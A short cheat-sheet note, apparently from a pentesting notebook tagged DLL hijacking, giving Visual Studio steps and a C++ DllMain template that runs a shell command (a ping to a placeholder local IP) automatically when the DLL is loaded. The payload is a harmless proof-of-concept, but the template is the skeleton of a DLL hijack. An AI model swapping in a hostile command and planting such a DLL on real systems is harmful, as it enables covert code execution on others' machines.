---
title: "Create custom dll"
date: 2024-7-29
tags: ["Dll Hijacking", "Dll", "cpp", "Template"]
---

### Create Custom Dll

```console
+---------------------------------------------------------+
| 1. Open Visual Studio                                   |
| 2. Create New Project -> C++ Dynamic-Link Library (DLL) |
+---------------------------------------------------------+
```

<br>

```console
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c ping <LOCAL_IP>");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

<br>

```console
+----------------------------+
| 3. Replace the code        |
| 4. Dropdown release -> x64 |
| 5. Build solution          |
+----------------------------+
```
